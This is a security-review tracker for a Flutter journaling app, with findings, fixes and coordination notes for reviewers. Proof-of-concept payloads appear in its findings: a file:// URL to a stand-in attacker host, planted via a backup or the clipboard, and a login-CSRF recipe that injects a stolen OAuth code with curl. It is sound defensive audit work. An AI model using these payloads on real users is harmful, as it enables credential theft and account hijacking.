# Security Review — Summary

Consolidated 2026-09-28 at commit `b9457a5`. All 12 sections are DONE, and every cross-section lead is resolved.

**Counts:** CRITICAL 0 · HIGH 0 · MEDIUM 1 · LOW 2. **All three fixed on 2026-09-28** (see each finding's Status line).

No attacker A (another Firebase user) path exists. The Firestore and Storage rules pin every path to `request.auth.uid`, the Functions use only `request.auth.uid`, and no secrets have ever been committed.

**Top issues:**
- **MEDIUM (§9, §12):** a job's `applicationUrl` is launched via `ShellExecuteW` with no scheme allow-list. A crafted backup, or a clipboard planted by a web page, can make "Open" hit a `file:`/UNC target (NTLM leak, remote file open) or any protocol handler. Fix: allow only http(s) at launch.
- **LOW (§2, §5, §7):** desktop Google sign-in sends no OAuth `state`, so a local process can inject its own code (login CSRF). The victim's new edits then sync to the attacker's account, and the attacker's docs and blobs merge into the victim's local DB. This depends on Google accepting a PKCE downgrade, which is unverified; if Google does, rate it MEDIUM.
- **LOW (§7):** a restored media row that shares a live image's `contentHash` makes the purge delete that image's blob locally and in Storage on every device.

**Incomplete coverage noted by sections:**
- §1: the enabled sign-in providers weren't checked in the Console.
- §2: whether Google accepts a PKCE downgrade, which sets the login-CSRF severity. `login_page.dart` was only skimmed.
- §3: whether OpenWeather error messages echo request params.
- §4: API-key restrictions (Console-only).
- §5, §8, §12: the large files (`remote_sync_service.dart`, `drift_repositories.dart`) and the residual sweep were covered by sink-grep, not line by line.
- §9: exactly which Windows prompts a UNC/WebDAV file type triggers. Android `url_launcher` wasn't assessed.
- §11: the rendering-only dev tiles were skimmed.

**Non-security notes worth acting on** (from the chat notes):
- Same-hash media rows created on two devices can wipe a shared blob (§7).
- The client writes `weather/current`, which the rules deny (§1).
- Android reminders may never fire because the notification receivers are missing (§10).
- The release APK is signed with the debug key (§4).
- `sync_compare.log` holds journal previews in the OneDrive-synced Documents folder (§11).
- There's no OpenWeather quota guard (§3).
- From the fix review:
  - When a purged row's blob is kept because another row shares its hash, the Storage object is removed only if that last claimant is `uploaded`. Otherwise it is left in Storage (a storage-cost leak).
  - A markdown `[x](mailto:…)` is stored as `https://mailto:…`, which opens the host after the `@` over https. Harmless, but untidy.

# Security Review — Master Tracker

## Instructions for any chat picking this up

You are one of several independent chats reviewing this repo (Voyager) for
security bugs. Each chat reviews **one section** from the table below. You do
not know what other chats did beyond what is written in this file, so this
file is the only shared state. Keep it accurate.

### Scope

Look for:
- **Injection:** SQL, command, template, LDAP, XPath, header, log.
- **Auth/authz flaws:** missing checks, IDOR, privilege escalation, broken
  session handling.
- **Secrets** in code or config.
- **Unsafe deserialization.**
- **Path traversal.**
- **SSRF.**
- **Insecure crypto:** weak algorithms, hardcoded keys or IVs, bad randomness,
  broken comparisons.

**Only report an issue if you can trace a concrete exploit path:** where the
attacker controls input, the steps it takes through the code, and the
dangerous call it reaches, with `file:line` at each step. No theoretical or
"best practice" findings. Out-of-scope classes (DoS, zip bombs, UI bugs,
dependency CVEs without a reachable path in this code) are not findings; if
you notice one, mention it in your Chat notes at most.

### Threat model (who "the attacker" can be)

Voyager is a single-user, local-first journaling/productivity app (Flutter;
Windows desktop is the primary target, Android secondary) that syncs each
user's data to their own Firebase project space. Most data is written and
read by the same person, so "the user attacks their own data" is **not** a
finding. A valid attacker is one of:

- **A. Another Firebase user** — anyone who can obtain a Firebase Auth token
  for project `voyager-db9de` (the API key and project ID ship in the app, so
  assume they can call Firestore/Storage/Functions directly with their own
  token). Targets: other users' data, backend secrets, backend cost.
- **B. A network attacker** — on-path, without breaking valid TLS.
- **C. Another local process / user on the same machine** — e.g. hitting the
  OAuth loopback listener on `127.0.0.1:4285`, broadcasting registered window
  messages, or planting/reading files in the app data directory.
- **D. Someone who hands the user a file** — a backup/import zip, a calendar
  file, a dragged/pasted image or file path.
- **E. A malicious or compromised third party** — LeetCode GraphQL,
  OpenWeather (via Cloud Functions), Google OAuth endpoints' responses as seen
  by the client.
- **F. Synced remote data** — Firestore/Storage documents are attacker input
  **only if** someone other than the owner can write them (depends on the
  Section 1 result; check Ruled Out / Findings before assuming either way),
  or via a path from D (import → sync → other device).

### Per-section workflow

a. Read this file (`SECURITY_REVIEW.md`) in full first.
b. Take the first section whose Status is `TODO` (unless the user names one)
   and set its Status to `IN PROGRESS` **immediately** — edit and save the
   file before doing any review — so parallel chats don't pick the same one.
c. Check **Cross-Section Leads** (any lead handed to your section) and
   **Ruled Out** for anything relevant to this section. Handle every lead
   addressed to your section; mark each one `→ resolved: <outcome>`.
d. Review only this section's paths. Follow data into other sections only as
   far as needed to confirm or rule out an exploit path.
e. Append findings to **Findings** using the template. Add new leads to
   **Cross-Section Leads** (naming the section it's handed to). Add anything
   you verified safe to **Ruled Out**, with the reason and a `file:line`.
f. Set the section to `DONE`, and in Chat notes write 1–2 lines on what was
   covered and anything left incomplete.
g. Edit only your section's row, and only **append** to the shared lists.
   Don't rewrite or delete other chats' entries (marking a lead handed to you
   as resolved is the one exception). Re-read the file right before saving,
   since another chat may have edited it meanwhile — merge, don't overwrite.
h. Finish by telling the user which section is next (the first remaining
   `TODO`, or "Final Consolidation" if none are left).

### Final consolidation (when every section is DONE)

The next chat after all sections are `DONE`:
1. Processes every open lead in Cross-Section Leads (confirm → finding, or
   refute → Ruled Out), marking each resolved.
2. Removes duplicate findings (keep the one with the most complete exploit
   path; note the merged section numbers in its title).
3. Sorts Findings by severity: CRITICAL, HIGH, MEDIUM, LOW.
4. Writes a short summary at the top of this file (above the Instructions):
   counts per severity, the top issues in one line each, and any section whose
   notes say coverage was incomplete.
5. Ticks the boxes in Final Consolidation.

### Practical notes for reviewers

- **Do not review code in `*.g.dart`** (Drift/JSON codegen) unless a path
  leads there; `lib/data/database/app_database.g.dart` alone is 72k lines.
- `graphify-out/graph.json` exists. `graphify query "<question>"` /
  `graphify path "<A>" "<B>"` can locate callers of a sink; treat results as
  a shortlist to read, not an answer.
- Don't build or run the app for this review; static reading plus targeted
  greps is enough. If you want to confirm a Firestore rules behaviour, reason
  from the rules text (no emulator is set up).
- Severity guide: CRITICAL = attacker A reads/writes other users' data or
  steals backend secrets; HIGH = code execution or account takeover via
  attacker B/C/D/E; MEDIUM = limited data exposure or integrity loss needing
  user interaction; LOW = hard-to-reach but concrete path.

## Repo Map

Mapped 2026-09-27 at commit `e3f10f5`. Pointers below are where to look, not
conclusions — nothing here has been verified safe or unsafe.

**Stack.** Flutter/Dart app (`lib/`, ~680 source files), Riverpod state,
go_router, Drift (SQLite) local DB, Firebase Auth / Firestore / Storage /
Cloud Functions. Platforms: Windows (`windows/runner/*.cpp`, plugins such as
hotkey_manager, tray_manager, window_manager, win32, win32_registry,
super_clipboard, super_drag_and_drop, flutter_local_notifications) and
Android (`android/app`). Backend: TypeScript Cloud Functions v2 in
`functions/src/`.

**Entry points.**
- App start: `lib/main.dart` (CLI arg `kStartHiddenArg`, line ~34);
  `windows/runner/main.cpp` (single-instance mutex
  `Local\Voyager.SingleInstance`, `HWND_BROADCAST` of a registered
  "show main window" message, line ~16–19; `CommandLineToArgvW` in
  `windows/runner/utils.cpp:24`); `windows/runner/flutter_window.cpp:35-36`
  (registered show/quit window messages).
- Android: `android/app/src/main/AndroidManifest.xml` (exported launcher
  activity, backup/data-extraction rules in `res/xml/`).
- Cloud Functions (`functions/src/index.ts`): `onCall` handlers
  `geocodeLocation` (~54), `refreshWeather` (~94),
  `refreshWeatherForecast` (~158); they build OpenWeather URLs from caller
  input (~67, ~112, ~200) and use secret `OPENWEATHER_API_KEY` via
  `defineSecret` (~15). Helper `functions/src/forecast_archive.ts`. No HTTP
  `onRequest`, triggers, or schedules found.
- Desktop callable client: `lib/data/remote/http_callable_client.dart`
  (raw HTTPS to `https://$region-$projectId.cloudfunctions.net/$name`);
  `lib/data/remote/cloud_function_weather_client.dart`;
  dev-only direct client `lib/data/remote/dev_openweather_client.dart`.
- Local HTTP listener: `lib/data/remote/desktop_google_oauth.dart:56`
  (`HttpServer.bind` on loopback port 4285 for the OAuth redirect).
- Global hotkeys & floater windows: `lib/features/hotkeys/**`.
- Scheduled/background work (in-process, no server cron):
  `lib/core/sync/outbox_sync_worker.dart`, `lib/core/sync/sync_engine.dart`,
  `lib/core/media/media_transfer_worker.dart`,
  `lib/features/settings/services/auto_backup_service.dart`,
  `lib/core/reminders/reminder_engine.dart`.
- File inputs: import/restore zips
  (`lib/features/settings/services/data_import_service.dart:331`,
  `auto_backup_service.dart:695` — `ZipDecoder`), calendar import
  (`lib/domain/services/calendar_event_import.dart`), image paste/drop
  (`lib/core/media/media_clipboard.dart`, `core/media/widgets/media_drop_target.dart`,
  `media_paste_scope.dart`, `media_attach.dart`), file_picker in
  `lib/features/settings/settings_page.dart` / `backup_list_dialog.dart`.

**Auth layer.**
- Firebase Auth (email/password + Google). App-side:
  `lib/app/auth_notifier.dart`, `lib/data/remote/firebase_auth_repository.dart`,
  `lib/features/auth/login_page.dart`, `lib/core/auth/firebase_auth_errors.dart`,
  route guarding in `lib/routing/app_router.dart`.
- Desktop Google sign-in: `oauth2` package, PKCE + loopback redirect in
  `lib/data/remote/desktop_google_oauth.dart`; client ID/secret are
  compile-time `--dart-define`s read in
  `lib/core/constants/google_auth_config.dart` (supplied from gitignored
  `dart_defines.json`).
- Locally patched plugin `third_party/firebase_auth-6.5.3/windows/firebase_auth_plugin.cpp`
  (thread marshalling + `reauthenticateWithCredential` fix; overridden in
  `pubspec.yaml`).
- Server-side authz is **only** `firestore.rules` and `storage.rules`
  (per-uid `users/{userId}/...`; `weather` collection client-read-only) plus
  whatever checks `functions/src/index.ts` does on `request.auth`.

**Data access.**
- Local: Drift DB `lib/data/database/app_database.dart` (4.1k lines, many
  schema/migration statements) and `lib/data/repositories/drift_repositories.dart`;
  repository interfaces in `lib/domain/repositories/`. Search UI in
  `lib/features/search/`.
- Remote: `lib/data/remote/firestore_sync_repository.dart`,
  `lib/core/sync/firestore_collections.dart` (collection/path names),
  `firestore_document_mapper.dart` (4.4k lines, remote map ⇄ model),
  `remote_sync_service.dart` (6.5k lines), `firestore_pull_service.dart`,
  `firestore_write_gate.dart`, CRDT/text merge (`crdt_document_resolver.dart`,
  `text_delta_injector.dart`, `char_ops_encoder.dart`).
- Media blobs: `lib/data/remote/firebase_media_storage.dart` (Storage path
  `users/{uid}/media/{contentHash}`), local store
  `lib/data/services/media_file_store.dart` (bare-name check on
  `contentHash` ~44–56; `Process.run('powershell', …)` ~175 and
  `Process.run('df', …)` ~193 for disk-space queries).
- App data dir resolution: `lib/core/platform/app_data_directory.dart`.

**Config & secrets.**
- `dart_defines.json` — gitignored (`.gitignore:13`), holds OAuth client
  ID/secret (and possibly a dev OpenWeather key).
- Tracked: `lib/firebase_options.dart`, `android/app/google-services.json`,
  `firebase.json` (project `voyager-db9de`).
- Build/CI: `scripts/build_release.ps1`, `.github/workflows/ci.yml` (no
  secrets referenced), agent hooks `.codex/hooks.json`, `.cursor/hooks.json`,
  `.github/hooks/impeccable.json`.
- Functions secret: `OPENWEATHER_API_KEY` (Secret Manager).

**Third-party integrations.** Firebase (Auth/Firestore/Storage/Functions);
Google OAuth endpoints; OpenWeather (server-side, plus dev client);
LeetCode GraphQL (`lib/data/remote/leetcode_api_client.dart`, HTML → text in
`leetcode_content.dart`); `url_launcher` call sites:
`lib/features/jobs/jobs_page.dart:439`, `jobs_edit_panel.dart:453`,
`lib/features/leetcode/leetcode_detail_view.dart:303`,
`leetcode_actions.dart:312`.

**Shared helpers.** No sanitizer layer exists; HTTP via `package:http`
clients above; JSON decoding scattered (`jsonDecode` in models/services);
debug loggers writing files under `lib/core/dev/` (`error_logger.dart`,
`journal_debug_logger.dart`, `perf_stall_logger.dart`,
`sync_compare_logger.dart`, `todo_sort_debug_logger.dart`); session
checkpoints `lib/core/session_resume/session_checkpoint_store.dart`.

## Sections

| # | Name | Paths/globs | What to focus on | Status | Chat notes |
|---|------|-------------|------------------|--------|------------|
| 1 | Firebase security rules | `firestore.rules`, `storage.rules`, `firebase.json`; cross-check against `lib/core/sync/firestore_collections.dart`, `lib/data/remote/firebase_media_storage.dart` | Attacker A: cross-user read/write, wildcard gaps (docs at depths not matched, `{collection}` = `weather` bypass via subcollection match at `users/{uid}/weather/{doc}/{sub}/{subdoc}`), whether every path the client uses is covered, Storage contentType/size bypasses, whether self-signup makes A trivially available. Result decides whether synced data (F) is untrusted for later sections — record it in Ruled Out or Findings explicitly. | DONE | No findings: every Firestore/Storage rule is pinned to `request.auth.uid == userId`, so F (synced data) is owner-written only. Enabled sign-in providers weren't checked in the Console. Non-security: client `upsertCurrentWeather` (`firestore_sync_repository.dart:315`) writes `weather/current`, which the rules deny. |
| 2 | Auth & session | `lib/app/auth_notifier.dart`, `lib/app/providers.dart` (auth/uid wiring), `lib/routing/app_router.dart`, `lib/features/auth/**`, `lib/core/auth/**`, `lib/data/remote/firebase_auth_repository.dart`, `lib/data/remote/desktop_google_oauth.dart`, `lib/core/constants/google_auth_config.dart`, `third_party/firebase_auth-6.5.3/windows/firebase_auth_plugin.cpp` | OAuth loopback (attacker C/B): `state`/PKCE handling, what the listener accepts, code interception by another local process racing port 4285, response header/HTML injection from query params. Session: uid used to scope local DB and remote paths — sign-out/account switch leaking user A's local data into user B's account via sync; reauth/change-password flow in the patched plugin; token storage. | DONE | Covered the loopback OAuth flow, uid wiring and sign-out, the router, and the plugin patches. One LOW finding: login CSRF from the missing `state`. Its severity hinges on whether Google accepts a PKCE downgrade, which I couldn't verify statically. `login_page.dart` was only skimmed via its repository calls. |
| 3 | Cloud Functions & callable clients | `functions/src/**`, `functions/package.json`, `lib/data/remote/http_callable_client.dart`, `lib/data/remote/cloud_function_weather_client.dart`, `lib/data/remote/dev_openweather_client.dart`, `lib/domain/services/weather_service.dart` | Attacker A: `request.auth` checks on each `onCall`; which uid the functions write under (`users/{uid}/weather`) — caller-supplied uid = IDOR; query-string/parameter injection into OpenWeather URLs (SSRF, API-key abuse, `appid` override); error messages leaking the key; dev client key source. | DONE | No findings. Covered all three `onCall` handlers, `forecast_archive.ts`, the HTTP callable client, both weather clients and how the client is chosen in `providers.dart`. Not settled statically: whether any OpenWeather error `message` echoes request params (it would take attacker E to exploit anyway). Out of scope, but worth knowing: there is no App Check, per-uid rate limit or `maxInstances`, so any self-signup user can burn the OpenWeather quota. |
| 4 | Secrets, build & repo config | Whole git history (`git log -p`/`git log --all -- <file>` for `dart_defines.json`, keys, tokens), `lib/firebase_options.dart`, `android/app/google-services.json`, `android/app/build.gradle.kts`, `scripts/*.ps1`, `.github/**`, `.codex/**`, `.cursor/**`, `.agents/**`, `*.md` at root (design docs may paste keys), `run_log.txt` | Secrets actually committed now or ever (OAuth client secret, OpenWeather key, service-account JSON, signing keys). Firebase web API keys are public by design — only a finding if paired with a rules gap (lead to §1). Build scripts that interpolate untrusted input into shell commands. | DONE | No findings. Scanned all 183 commits (every ref) for key, secret and private-key patterns, including decoding the UTF-16/NUL blobs that `git log -G` and `grep -I` silently skip (`run_log.txt`, `test.dart`, `job_queries.dart`, `vim_session_test.dart`). Also swept the current tree including untracked files, plus the build script, CI and agent hooks. Not checked, since they're Console-only: API-key restrictions on the two Firebase keys. Hygiene, not an exploit path: the Android release build is signed with the local debug key (`android/app/build.gradle.kts:33-35`). |
| 5 | Sync pipeline (remote ⇄ local) | `lib/core/sync/**`, `lib/data/remote/firestore_sync_repository.dart`, `lib/data/remote/in_memory_sync.dart`, `lib/features/sync/**` | Trust of remote documents (attacker F, gated on §1): doc IDs / fields flowing into file paths, SQL, or other users' paths; deserialization in `firestore_document_mapper.dart` (type confusion leading to a dangerous sink, not mere crashes); whether remote paths are always built from the signed-in uid (never from document data); CRDT/text injector handling of attacker-shaped ops only if it reaches a sink. | DONE | No findings. The sync code has no SQL-string, file, process or URL sink, and every remote path uses the signed-in uid. Remote fields that do reach sinks (`contentHash`, URLs, `leetcodeUsername`) belong to Sections 7 and 9 and are handed over as leads. Resolved the Section 2 lead: after a login-CSRF, the victim's device pulls the *attacker's* documents, so F becomes attacker input in that scenario. The 6.5k-line `remote_sync_service.dart` was reviewed by sink-grep plus the id, backfill and watermark paths, not line by line. |
| 6 | Import, export & backups | `lib/features/settings/services/**`, `lib/features/settings/backup_list_dialog.dart`, `lib/features/settings/settings_page.dart` (file picker/import handlers), `lib/domain/services/calendar_event_import.dart`, `lib/domain/services/color_palette_codec.dart` | Attacker D: zip-slip / path traversal in entry names on import and restore (`data_import_service.dart:331`, `auto_backup_service.dart:695`), manifest-driven file writes/deletes, backup filenames used in paths, deserialization of imported JSON into rows (IDs that later become paths or remote doc paths), imported data being pushed to Firestore under another uid, calendar file parsing reaching sinks. | DONE | No findings. Covered export, import/restore, the auto-backup service and its retention, the backup list dialog, the settings-page picker handlers, calendar import and the palette codec. No archive member is ever written to disk by its entry name. Restored media blobs are written only under a hash-checked `contentHash`. Every other record goes through the Drift repositories and is uploaded under the signed-in uid. What a malicious backup can inject (media rows, URLs, reminder rows) is handed to Sections 7, 9 and 10 as leads. Out of scope: there is no size cap on the zip or its members (`data_import_service.dart:106,331`), so a zip bomb is possible, but that is DoS. |
| 7 | Media pipeline | `lib/core/media/**`, `lib/data/services/media_file_store.dart`, `lib/data/remote/firebase_media_storage.dart` | Command injection in `Process.run('powershell', …)` (~175) / `df` (~193) — what path/argument reaches them; `contentHash`/format from synced or restored records → local file path and Storage path (verify `_isBareName` covers every call site); drag-drop/paste file paths (attacker D) → reads of arbitrary files that then upload to cloud; hash verification of downloaded blobs. | DONE | One LOW finding: a restored media row that shares a live image's `contentHash` can make the purge delete that image's local blob and Storage object on every device. Covered the file store (including both `Process.run` calls), Storage client, transfer worker, ingest, purge, clipboard/drop/picker inputs and the lightbox save. Resolved the Section 6 lead. Not a finding, but a real data-loss bug: two devices that ingest the same image independently create two rows with one hash, so expiring either row wipes the shared blob. |
| 8 | Local database & repositories | `lib/data/database/app_database.dart`, `lib/data/repositories/drift_repositories.dart`, `lib/domain/repositories/**`, `lib/features/search/**` | SQL injection: every `customStatement`/`customSelect`/`customUpdate`/string-built SQL, LIKE/FTS `MATCH` built from search text or synced values; migrations that interpolate values. Trace whether any interpolated value is attacker-controlled (D/F), not just user-typed. | DONE | No findings. Every raw SQL site in `app_database.dart` and `drift_repositories.dart` (grepped for `custom*`, `execute`, `LIKE`, `MATCH`, `$`-interpolation) either binds values with `?` or interpolates only code literals. Search is filtered in Dart, and there is no FTS. `lib/domain/repositories/**` holds interfaces only. The rest of `drift_repositories.dart` (7k lines) is typed Drift builders; I covered it by sink-grep, not line by line. |
| 9 | External content & URL handling | `lib/data/remote/leetcode_api_client.dart`, `lib/data/remote/leetcode_content.dart`, `lib/features/leetcode/**`, `lib/features/jobs/**`, `lib/data/services/quotes_loader.dart`, `lib/core/text/**` (link/markdown rendering), any other `launchUrl` call site | Attacker D/E/F: URLs from imported/synced/third-party data passed to `launchUrl` without scheme allow-listing (`file:`, `ms-*:` handlers, `javascript:`) at `jobs_page.dart:439`, `jobs_edit_panel.dart:453`, `leetcode_detail_view.dart:303`, `leetcode_actions.dart:312`; GraphQL query construction from user input (injection); HTML parsing of LeetCode content reaching a renderer or file. | DONE | One MEDIUM finding: a job's `applicationUrl` goes to `ShellExecuteW` with no scheme check, so a crafted backup can make "Open" launch `file:`/UNC targets or any registered protocol handler. Resolved both leads addressed to Section 9. Covered every `launchUrl` site in `lib/`, the LeetCode client and HTML parser, `lib/core/text/**` and the quotes loader. Not verified: exactly which prompts Windows shows for a given UNC/WebDAV file type (that decides whether code execution needs one click or two). |
| 10 | Desktop/Android platform & IPC | `windows/runner/**`, `lib/core/platform/**`, `lib/features/hotkeys/**`, `lib/core/reminders/**`, `lib/features/notifications/**`, `lib/core/session_resume/**`, `lib/main.dart`, `android/app/src/**` | Attacker C: registered window messages broadcast to `HWND_BROADCAST` (can any process trigger quit/show or more?), single-instance mutex squatting, command-line args, launch-at-login registry value (`launch_at_login.dart` — quoted path? path from where?), app data dir permissions/location, notification payloads → actions, session checkpoint files read back and trusted. Android: exported components, `allowBackup`/extraction rules exposing the DB. | DONE | No findings. Covered the Windows runner (mutex, broadcast show/quit messages, argv), launch-at-login, the app-data dir and its move out of Documents, session checkpoints, the quick-journal pointer, reminder OS notifications and tap handling, device registrations, notification and floater navigation, and the Android manifest and backup rules. Resolved the Section 6 lead. Out of scope: any same-desktop process can post `Voyager.Quit` and close the app, which is DoS. Not a security issue, and unverified: the app manifest declares none of `flutter_local_notifications`' receivers, and the plugin's own manifest doesn't either, so Android scheduled reminders may never fire. |
| 11 | Dev/debug surfaces & logging | `lib/core/dev/**`, `lib/features/dev/**`, `scripts/purge_out_of_sync_journal_entries.ps1` | Whether dev tools (remote purge, weather API tile, sync compare) are reachable in release builds and what they can do; secrets/tokens or journal contents written to world-readable log files (e.g. under Documents); log injection only if a log is later parsed/acted on. | DONE | No findings. The Dev page ships in release builds but is only reachable by the signed-in user. Its destructive tools (remote purge, out-of-sync purge) are uid-scoped, and its dev flags are local-only (neither synced nor restored). Covered all 12 `lib/core/dev` files, the purge, weather, sync-compare and log tiles, and the purge script. Rendering-only tiles (geometric, leaf gallery, FPS) were skimmed. Not a boundary, but worth knowing: the logs sit in the user's Documents folder, which OneDrive may sync, and `sync_compare.log` holds 200-char previews of journal bodies. |
| 12 | Residual sweep: domain & remaining features | `lib/domain/**`, `lib/features/**` and `lib/core/**` not covered above | Grep-driven sink sweep, not line-by-line: `Process.`, `File(`, `Directory(`, `jsonDecode`, `launchUrl`, `Uri.parse`, `http.`, `Random(`, `sha`/`md5`, `==` on secrets/tokens. Anything found that belongs to an earlier section goes to Cross-Section Leads if that section is DONE. | DONE | No findings. Grep-swept all of `lib/` (minus `*.g.dart`) for `Process.`, `File(`, `Directory(`, `jsonDecode`, `launchUrl`, `Uri.parse`, `http.`, `Random(`, `sha*`/`md5`, FFI `DynamicLibrary`, `Clipboard.getData` and `==` on token/secret/hash names, then read only the hits outside Sections 1–11. One new *source* for the Section 9 sink: the Jobs Track form auto-reads the clipboard on open and keeps a markdown link's scheme, so a clipboard-hijacking web page can plant a `file:`/custom-scheme `applicationUrl`. Handed to Final Consolidation as an addition to the Section 9 finding. Coverage is sink-driven, not line-by-line. |

## Findings

Template:

```
### [SEVERITY] Short title — Section N
- Class: (e.g. SQL injection)
- Location: file:line
- Exploit path: source (file:line) → ... → sink (file:line)
- Preconditions: (auth required? which role? which config?)
- Proof of concept: (example request or input)
- Fix: (short)
```

### [MEDIUM] Job `applicationUrl` is passed to `ShellExecuteW` with no scheme allow-list — Sections 9, 12
- Status: FIXED. `launchableJobUri` (`lib/features/jobs/job_clipboard_parser.dart`) allows only http(s) with a host, and both `_openUrl`s use it. `normalizeJobUrl` no longer stores other schemes from the clipboard. By decision, `mailto:`/`obsidian://` job links no longer open. Tests: `test/job_clipboard_parser_test.dart`.
- Class: Command/handler injection via an unrestricted URL launch (arbitrary `file:`/UNC open, arbitrary protocol handler)
- Location: `lib/features/jobs/jobs_page.dart:436-440`, `lib/features/jobs/jobs_edit_panel.dart:450-454`
- Exploit path:
  1. The attacker hands the victim a backup zip whose `job_applications` collection holds a row with `applicationUrl: "file://attacker.example/share/Offer.pdf.lnk"`, or any `<scheme>://…` string. Restore merges it (`lib/features/settings/services/data_import_service.dart:137-156`) via `mergeJobApplicationFromRemote` (`lib/features/settings/services/backup_collections.dart:999-1001`), which copies the string as-is (`lib/core/sync/firestore_document_mapper.dart:1477`). It then pushes to `users/<victimUid>/job_applications` and reaches every device of the victim. The login-CSRF path (Section 2/5 leads) delivers the same field.
  2. The victim clicks "Open" in the edit panel (`jobs_edit_panel.dart:253-270`) or "Open URL" in the row's context menu (`jobs_page.dart:291-292`; `jobs_table.dart:79`).
  3. `_openUrl` only prefixes `https://` when the string lacks `://`. Any other value with `://` is parsed and launched unchanged (`jobs_page.dart:437-439`; `jobs_edit_panel.dart:451-453`) with `LaunchMode.externalApplication`.
  4. `url_launcher` checks the scheme only for in-app modes (`url_launcher-6.3.2/lib/src/url_launcher_uri.dart:46-51`). On Windows, `url_launcher_windows` percent-decodes `file:` URLs and calls `ShellExecuteW(nullptr, "open", url, …)` (`url_launcher_windows-3.1.5/windows/url_launcher_plugin.cpp:101-119`).
  5. Effects of that call:
     - A `file://host/share/…` target makes Windows connect to the attacker's SMB/WebDAV server, sending the user's NTLM credentials with no further prompt (credential exposure).
     - It then opens the remote file with its registered handler (`.lnk`, `.exe`, `.hta`, `.library-ms`, etc.). Windows may show an "Open File – Security Warning" or SmartScreen prompt for some types.
     - Alternatively, a `<handler>://…` URL runs any registered protocol handler (e.g. `search-ms://`, `ms-settings://`, third-party handlers) with attacker-chosen arguments.
- Second source, no file needed (merged from Section 12):
  - Opening the Jobs "Track" form reads the clipboard automatically (`lib/features/jobs/jobs_track_modal.dart:319-334`) and fills an empty URL field.
  - `parseJobClipboard` accepts a whole-string markdown link `[Title](<any-scheme>://…)` (`lib/features/jobs/job_clipboard_parser.dart:25,86-92`), and `normalizeJobUrl` keeps any existing scheme (`:56,128-131`).
  - So a web page that overwrites the clipboard on copy can plant `[Senior SWE](file://attacker.example/s/Offer.lnk)`. The victim opens Track, sees Title and URL pre-filled, and saves. Clicking "Open" later reaches the same sink.
  - The URL is visible in the form before saving, so this needs more interaction than the backup path and doesn't raise the severity.
- Preconditions:
  - Attacker D, or F via the Section 2 login-CSRF, or a clipboard-hijacking web page (above). The victim must restore the file (or save the pre-filled form) and then click "Open" on that job.
  - The UI shows the URL text in the field, so an alert user might notice it.
  - Rated MEDIUM because at least one click is needed and Windows may prompt before running an executable. If a handler or file type runs without a prompt, this is HIGH (code execution via D).
  - Android (`url_launcher_android`) was not assessed.
- Proof of concept: `job_applications.json` contains `[{"id":"j1","data":{"company":"Acme","title":"SWE","status":"Applied","applicationUrl":"file://attacker.example/s/Offer.lnk","updatedAt":"2026-01-01T00:00:00Z"}}]`, listed in the manifest `collections`. Copy the other manifest fields from a real export, as in the Section 7 PoC. Restore, open the job, then click "Open". Watch for an outbound SMB/WebDAV connection to `attacker.example`.
- Fix: in both `_openUrl`s (ideally one shared helper), parse the URL, then refuse to launch unless `uri.scheme` is `http` or `https` and `uri.host` is non-empty. Apply the same check to any future `launchUrl` of stored data. Optionally also have `normalizeJobUrl` reject non-http(s) schemes, so the clipboard source can't store one.

### [LOW] Desktop Google sign-in has no `state`, so login CSRF can route new entries into the attacker's account — Sections 2, 5, 7
- Status: FIXED.
  - The authorization URL carries 32 random bytes of `state` from `Random.secure()`. The loopback listener answers 400 to any request without it and keeps waiting, and `oauth2` rechecks it (`lib/data/remote/desktop_google_oauth.dart`). Verified with a throwaway probe against the real listener.
  - Downloads are now hash-checked before `writeBytes` (`lib/core/media/media_transfer_worker.dart`).
  - Clearing local data on account switch was deliberately left out.
- Class: Broken session handling (OAuth login CSRF / session fixation)
- Location: `lib/data/remote/desktop_google_oauth.dart:51-54`, `:71`, `:86-88`
- Exploit path:
  1. The victim is signed out and clicks "Sign in with Google" on Windows.
  2. The app opens the loopback listener on `127.0.0.1:4285` for up to 5 minutes (`desktop_google_oauth.dart:56-60,71-76`).
  3. The authorization URL is built with no `state` (`:51-54`), so `oauth2`'s `handleAuthorizationResponse` skips its state check (`oauth2-2.0.5/lib/src/authorization_code_grant.dart:241`).
  4. The attacker sends `GET http://127.0.0.1:4285/?code=<ATTACKER_CODE>` before the browser's real redirect arrives. `server.first` takes whichever request comes first, from any caller (`:71`).
  5. The app redeems the attacker's code with its own client secret and PKCE verifier (`:86-88`), then calls `signInWithCredential` (`lib/data/remote/firebase_auth_repository.dart:103-108`). The victim is now signed in as the attacker.
  6. Sign-out never clears the single on-disk DB (`firebase_auth_repository.dart:112`; `lib/app/providers.dart:116-117`), so the victim still sees their own data and may not notice anything.
  7. The sync repository and outbox rebind to the new uid (`providers.dart:488-492`; `lib/core/sync/outbox_sync_worker.dart:192,292`). Every queued and new edit — journal entries, finance, etc. — uploads to `users/<attackerUid>/...`, which the attacker reads.
- Additional impact, pull side (merged from Sections 5 and 7):
  - While the victim is signed in as the attacker, the pull merges `users/<attackerUid>/...` into the shared local DB, and it stays there after the victim signs back in.
  - Fixed document ids let the attacker overwrite or tombstone the victim's matching local rows without guessing ids: `settings/app` (`lib/data/remote/firestore_sync_repository.dart:164`), `legacy-default-journal` and `legacy-default-todo-list` (`lib/core/constants/journal_constants.dart:6`, `todo_constants.dart:6`).
  - Attacker-chosen job URLs and media `contentHash` values reach the victim's device, so this is also a delivery path for the MEDIUM `applicationUrl` finding.
  - Downloaded blobs aren't hash-verified (`lib/core/media/media_transfer_worker.dart:268-269`), and `writeBytes` overwrites an existing file whose length differs (`lib/data/services/media_file_store.dart:83-86`). An attacker asset row whose `contentHash` equals one of the victim's hashes therefore writes the attacker's bytes over the victim's local blob, and that persists after sign-back.
- Preconditions:
  - Attacker C (any process, including one under another Windows user, since loopback is shared), or a web page, if the browser still lets public sites reach loopback.
  - The victim must be signing in with Google at that moment.
  - **Unverified:** Google must redeem a code issued *without* `code_challenge` even though the token request carries a `code_verifier` (a PKCE downgrade). If Google rejects that, PKCE blocks the attack and this becomes a hardening note. Nothing static in this repo can settle this.
  - If the downgrade works, rate this MEDIUM.
- Proof of concept:
  1. The attacker opens `https://accounts.google.com/o/oauth2/v2/auth?client_id=<shipped client id>&redirect_uri=http://127.0.0.1:4285&response_type=code&scope=openid%20email%20profile` (no `code_challenge`) and signs in with their own account.
  2. They capture the `code` without letting it reach a listener.
  3. They send `curl "http://127.0.0.1:4285/?code=<code>"` while the victim's sign-in is pending.
- Fix:
  - Pass a random `state` (e.g. 32 bytes from `Random.secure()`) to `getAuthorizationUrl`. The package then enforces it.
  - Loop over requests until one arrives on the expected path with a matching `state`, instead of trusting `server.first`.
